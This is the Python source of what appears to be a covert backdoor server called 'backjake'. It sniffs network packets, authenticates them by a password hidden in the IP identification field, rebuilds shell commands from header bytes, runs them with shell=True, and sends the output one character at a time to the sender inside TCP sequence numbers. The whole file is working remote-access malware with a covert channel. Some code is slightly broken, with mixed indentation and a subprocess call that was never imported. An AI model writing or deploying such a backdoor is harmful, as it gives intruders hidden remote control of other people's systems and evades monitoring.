import socket
from subprocess import Popen, PIPE
from scapy.all import *
from struct import *
import sys
import os
import threading
import pcapy
import config
import backjake
import utils

command = ""

def recieveDatagram():
	cap = pcapy.open_live(config.dev, 65536, 1, 0)
	cap.setfilter('tcp or udp or icmp')

	while(backjake.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def startServer():
	listenThread = threading.Thread(target=recieveDatagram)
	listenThread.daemon = True
	listenThread.start()

def packetHandler(packet):
	if (authenticated(packet)):
		pacType = utils.checkType(packet)
		ip, protoH, data = utils.stripPacket(packet, pacType)
		checkCommand(ip, protoH, data, pacType)

def authenticated(packet):	
	ethLength = 14
	ipLength = 20
	ip = packet[ethLength:ipLength+ethLength]
	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
	ipIdent = ipHeader[3]
	pswd = utils.encrypt(config.password)

	# check ip identification field for encrypted password
 	if ipIdent == pswd:
 		return True

 	return False

def checkCommand(ip, proto, data, pacType):
	global command
	character = ''

	if pacType == 'tcp':
		character = proto[2]
	elif pacType == 'udp':
		character = proto[3]
	elif pacType == 'icmp':
		character = proto[2]

	# print proto
	if character != 15:
		command += chr(character)
	else:
		executeCommand(socket.inet_ntoa(ip[8]))

def executeCommand(srcAddress):
	global command
	# check if command is within the backdoor
	# otherwise, exec it
	# clear command at the end
	
	# directory = os.system("pwd")
	# results = os.system(command)
	# shell = str(directory) + " > " + str(results)
	# print shell -> send results back to client
	directory = subprocess.Popen("pwd", shell=True, stdout=PIPE).stdout.read() 
	results = subprocess.Popen(command, shell=True, stdout=PIPE).stdout.read()
	shell = "["+directory[:-1] + "]# " + results

	sendThread = threading.Thread(target=sendResults, args=(str(shell),srcAddress))
	sendThread.daemon = True
	sendThread.start()

	command = ""

def sendResults(results, address):
	# encrypt results 
	# for each character, send a packet to address
	for c in results:
		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)), verbose=0)

	send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15), verbose=0)